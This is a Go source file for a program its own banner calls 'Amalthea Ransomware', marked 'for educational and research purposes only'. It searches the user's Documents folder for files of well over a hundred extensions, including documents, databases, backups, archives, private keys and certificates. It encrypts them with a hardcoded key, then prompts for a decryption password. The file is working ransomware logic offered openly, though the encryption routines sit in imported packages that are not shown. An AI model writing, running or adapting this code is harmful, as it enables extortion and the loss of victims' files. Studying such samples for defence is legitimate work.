package main

// Import all the required packages
import (
	"fmt"
	"os"
	"runtime"

	"github.com/UpperCenter/Amalthea/src/encryption"
	"github.com/UpperCenter/Amalthea/src/files"
	"github.com/gookit/color"
)

// Get users home directory
func userHomeDir() string {
	// Check GOOS for compile architecture.
	if runtime.GOOS == "windows" {
		home := os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
		if home == "" {
			home = os.Getenv("USERPROFILE")
		}
		return home
		// If GOOS == Linux, get Linux ~ path.
	} else if runtime.GOOS == "linux" {
		home := os.Getenv("XDG_CONFIG_HOME")
		if home != "" {
			return home
		}
	}
	return os.Getenv("HOME")
}

func main() {
	// 32 Bit Encryption Password.
	key := "yjXTF0KtaEk3wOTdV2IZWbazSZPP8JMM"
	/*
		Only encrypt files and folders in this directory & subdirectories.
		TODO: Update File discovery to exclude SYSTEM owned files.
	*/
	rootDir := userHomeDir() + "\\Documents\\"
	// Art Banner
	banner := color.Red.Sprint(`
	
	 _______  _______  _______  _       _________          _______  _______ 
	(  ___  )(       )(  ___  )( \      \__   __/|\     /|(  ____ \(  ___  )
	| (   ) || () () || (   ) || (         ) (   | )   ( || (    \/| (   ) |
	| (___) || || || || (___) || |         | |   | (___) || (__    | (___) |
	|  ___  || |(_)| ||  ___  || |         | |   |  ___  ||  __)   |  ___  |
	| (   ) || |   | || (   ) || |         | |   | (   ) || (      | (   ) |
	| )   ( || )   ( || )   ( || (____/\   | |   | )   ( || (____/\| )   ( |
	|/     \||/     \||/     \|(_______/   )_(   |/     \|(_______/|/     \|

	`)
	// Subheading
	sub := color.Cyan.Sprint("Amalthea Ransomware")
	// Warning
	warn := color.Yellow.Sprint("For educational and research purposes only.")
	// Password Prompt
	decrypt := color.Magenta.Sprint("Enter Decryption Password:")
	// Decrypted Files Array:
	decryptFiles := color.Green.Sprint("The following files have been decrypted:")
	// Only Encrypt these file extensions.
	fileExtensions := []string{
		"3dm", "max", "3ds", "uot", "stw", "sxw", "ott", "odt", "rpm",
		"7z", "rar", "zip", "backup", "bin", "bac", "iso", "vcd", "bmp", "png", "gif", "raw",
		"accdb", "sql", "sqlitedb", "sqlite3", "asc", "lay6", "lay", "mml", "sxm", "otg", "odg",
		"cgm", "tif", "tiff", "nef", "psd", "ai", "svg", "djvu", "m4u", "m3u",
		"csv", "rtf", "wks", "wk1", "pdf", "dwg", "onetoc2", "snt",
		"doc", "docx", "xls", "xlsx", "ppt", "dat",
		"gpg", "aes", "arc", "paq", "bz2", "tbk", "bak", "bac", "tar", "tgz", "gz",
		"hwp", "62", "sxi", "sti", "sldx", "sldm", "vdi", "vmdk", "vmx",
		"jar", "java", "rb", "asp", "php", "jsp", "brd", "sch", "dch", "dip", "pl",
		"jpeg", "jpg", "docb", "docm", "dot", "dotm", "dotx", "xlsm",
		"mid", "wma", "flv", "3g2", "mkv", "3gp", "mp4", "mov", "avi", "asf",
		"mpeg", "vob", "mpg", "wmv", "fla", "swf", "wav", "mp3", "sh", "class",
		"pem", "p12", "csr", "crt", "key", "pfx", "der", "ink", "inc",
		"pot", "pps", "ppsm", "ppsx", "ppam", "potx", "potm", "edb",
		"pptx", "pst", "ost", "bin", "cab", "msg", "eml", "vsd", "vsdx", "txt",
		"suo", "sln", "ldf", "mdf", "ibd", "myi", "myd", "frm", "odb", "dbf", "db", "mdb",
		"uop", "std", "sxd", "otp", "odp", "wb2", "slk", "dif", "stc", "sxc", "ots", "ods",
		"vb", "vbs", "ps1", "bat", "cmd", "js", "ts", "asm", "h", "pas", "cpp", "c", "cs",
		"xlsb", "xlw", "xlt", "xlm", "xlc", "xltx", "xltm", "pptm",
	}
	/*
		`size` defines the maximum file size to encrypt.
		32MB, as large files increase decryption time.
		32 * 1024 * 1024
	*/
	size := 33554432

	// Calls `NewFiles` and begins searching for files to encrypt.
	e := files.NewFiles(rootDir, fileExtensions, size)
	systemfiles, err := e.ScanToEncrypt()
	if err != nil {
		fmt.Println(err)
	}

	// Uses values gathered from `NewFiles` and encrypts using `key` paramiter.
	for _, file := range systemfiles {
		enc := encryption.NewEncryption(file, key)
		enc.EncryptFile()
	}

	// Banner
	color.Println(banner)
	// Subheading
	color.Info.Println(sub)
	// Warning
	color.Warn.Println(warn)
	// Prompt user for password to decrypt
	color.Warn.Println(decrypt)

	var password string
	fmt.Scanln(&password)
	// Decrypt files, if valid password is provided.
	efs := files.NewFiles(rootDir, fileExtensions, size)
	encryptedfiles, _ := efs.ScanToDecrypt()

	// Compare user provided password with set value
	if password == key {
		for _, file := range encryptedfiles {
			// Decrypts files if password is correct.
			enc := encryption.NewEncryption(file, key)
			color.Println(decryptFiles)
			enc.DecryptFile()
		}
		fmt.Println(encryptedfiles)
		// Print an error if decryption fails.
	} else {
		fmt.Println("Decryption Failed. Is the password correct?")

	}
}
